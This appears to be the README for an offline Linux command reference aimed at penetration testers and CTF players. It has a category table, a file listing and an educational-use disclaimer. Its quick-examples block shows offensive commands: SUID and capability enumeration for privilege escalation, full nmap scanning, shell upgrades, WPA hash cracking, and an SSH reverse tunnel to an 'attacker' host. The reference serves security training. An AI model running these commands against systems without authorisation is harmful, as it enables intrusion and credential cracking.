# 361 Linux commands every hacker needs — free, offline, one file. 🐧🔐

---

> *A complete command reference for cybersecurity professionals — from recon to privilege escalation, forensics to reverse engineering.*

---

## 🗂️ What's Inside

| Category | Commands | Focus |
|---|---|---|
| 📁 File & Directory | 26 | Navigation, search, attributes |
| 📝 Text & File Content | 25 | grep, awk, sed, strings, hex |
| 🔒 Permissions | 13 | chmod, sudo, ACLs, SUID |
| 👤 User Management | 16 | useradd, last, lastb, finger |
| ⚙️ Process Management | 26 | ps, strace, lsof, cron |
| 🌐 Networking | 45 | nmap, nc, tcpdump, aircrack |
| 🔐 Crypto & Hashing | 18 | hashcat, john, hydra, gpg |
| 🖥️ System Info | 33 | uname, env, journalctl |
| 📦 Package Management | 15 | apt, pip, gem, cargo |
| 💾 Disk & Filesystem | 17 | dd, shred, mount, forensics |
| 🐚 Shell & Scripting | 17 | bash, TTY upgrades, traps |
| 🗜️ Archives | 11 | tar, zip, 7z, rar |
| 🔗 Remote Access | 15 | ssh tunnels, tmux, rsync |
| 🔍 Forensics & Logs | 21 | gdb, radare2, volatility |
| ⬆️ Privilege Escalation | 16 | SUID, capabilities, PrivEsc |
| 🛠️ Misc Utilities | 43 | docker, kubectl, scripting |

---

## 📦 What You Get

```
linux_bible/
├── index.html     ← open in any browser, works offline
├── styles.css     ← hacker terminal aesthetic
├── data.js        ← all 361 commands + real-world usage
└── app.js         ← search, filter, category pills
```

---

## ✨ Features

- 🔎 **Live search** — filter by command name, category, or usage
- 🏷️ **Category pills** — click to filter by topic instantly
- 💻 **Real-world usage** — every command has actual hacker examples
- 🌑 **Hacker terminal theme** — scanlines, phosphor green, grid
- 📴 **100% offline** — no internet required after download
- 🗂️ **Clean code** — HTML, CSS, and JS fully separated

---

## 🚀 Quick Examples

```bash
# Find all SUID binaries (privesc enum)
find / -perm -4000 -type f 2>/dev/null

# Full port scan + version + scripts
nmap -sV -sC -p- -T4 target -oA full_scan

# Upgrade dumb shell to full TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Crack WPA handshake
hashcat -m 22000 wpa.hc22000 rockyou.txt

# SSH reverse tunnel through firewall
ssh -R 4444:localhost:4444 user@attacker

# Find Linux capabilities (stealthy root path)
getcap -r / 2>/dev/null
```

---

## ⚠️ Disclaimer

> This reference is for **educational purposes only**.
> Always practice in a **legal environment** you own or have explicit permission to test.
> Platforms: [TryHackMe](https://tryhackme.com) · [HackTheBox](https://hackthebox.com) · [OverTheWire](https://overthewire.org)

---

## 🧠 Who Is This For?

- Beginners learning Linux for cybersecurity
- CTF players who want a fast offline reference
- Pentesters doing recon and enumeration
- Security students preparing for OSCP / CEH / eJPT
- Anyone who keeps googling the same commands

---

*Built with care. Shared for free. Use it well.* 🖤

```
root@kali:~# ./linux_hacker_bible --help
```
